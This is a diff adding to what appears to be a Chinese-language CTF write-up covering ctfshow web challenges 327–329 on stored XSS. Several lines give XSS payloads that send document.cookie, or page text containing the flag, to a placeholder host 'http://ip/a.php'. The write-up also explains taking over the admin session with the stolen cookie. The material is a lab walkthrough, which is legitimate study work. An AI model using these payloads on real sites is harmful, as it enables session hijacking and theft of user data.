@@ -745,6 +745,24 @@
 <p>所以payload:</p>
 <p><code>&lt;body/onload=&quot;document.location.href=&#39;http://ip/a.php?1=&#39;+document.cookie&quot;&gt;&lt;/body&gt;</code></p>
 <h3 id="web327"><a href="#web327" class="headerlink" title="web327"></a>web327</h3><p>开始来到存储型XSS，难度起来了。</p>
+<p>这题注意收件人要是admin</p>
+<p>然后信的内容还是老样子</p>
+<p><code>&lt;body/**/onload=&quot;document.location.href=&#39;http://ip/a.php?1=&#39;+document.cookie&quot;&gt;&lt;/body&gt;</code></p>
+<h3 id="web328"><a href="#web328" class="headerlink" title="web328"></a>web328</h3><p>这题打开会发现貌似没有传xss payload的地方，但是细心的同学会发现</p>
+<p><img src="https://img-blog.csdnimg.cn/95d22da9a76543d092a55bfe6c356e87.png"></p>
+<p>也就是说，如果我们是admin，说不定就拿到flag了，那咱们有了admin的cookie，是不是就能伪装成admin呢</p>
+<p>那么还是怎么传payload的问题，密码为啥不能是payload，注册就拿到cookie了</p>
+<p>这题body不能用了，返璞归真，用script</p>
+<p><code>&lt;script&gt;document.location.href=&#39;http://ip/a.php?1=&#39;+document.cookie;&lt;/script&gt;</code></p>
+<p><img src="https://img-blog.csdnimg.cn/6c6c25f8ce1e4a6cb0eb22b106999dfe.png"></p>
+<p>如果你很不幸x到了自己，出了多个sessionid，那么就选最后一个</p>
+<p>然后抓包，改个cookie就OK</p>
+<p><img src="https://img-blog.csdnimg.cn/079be7dd24cb40a6a951ea0c8b402c17.png"></p>
+<h3 id="web329"><a href="#web329" class="headerlink" title="web329"></a>web329</h3><p>在这个例子中，admin的sessionid每次会话都会变，所以没办法使用sessionid进行登录（机器人好像设置的是上去一下就下来），那么思路就是让注入的XSS Payload自动读取本页面的带有<code>ctfshow</code>的字段并发到vps上。<br> 注册一个普通账号并登录，修改一个显示密码的地方为<code>ctfshow&#123;123456&#125;</code>，然后尝试直接在console中将这段字段读出来并发送到vps中，使用jQuery的类选择器：</p>
+<p><img src="https://img-blog.csdnimg.cn/b4479820aae947afbedefc02e3edfef9.png"></p>
+<p>群主就根据这个东西写出来了payloa</p>
+<p><code>&lt;script&gt;$(&#39;.laytable-cell-1-0-1&#39;).each(function(index,value)&#123;if(value.innerHTML.indexOf(&#39;ctf&#39;+&#39;show&#123;&#39;)&gt;-1)&#123;window.location.href=&#39;http://ip/a.php?1=&#39;+value.innerHTML;&#125;&#125;);&lt;/script&gt;</code></p>
+<p>还是拿这个当作密码，就可以了。</p>
 ]]></content>
       <tags>
         <tag>wp</tag>
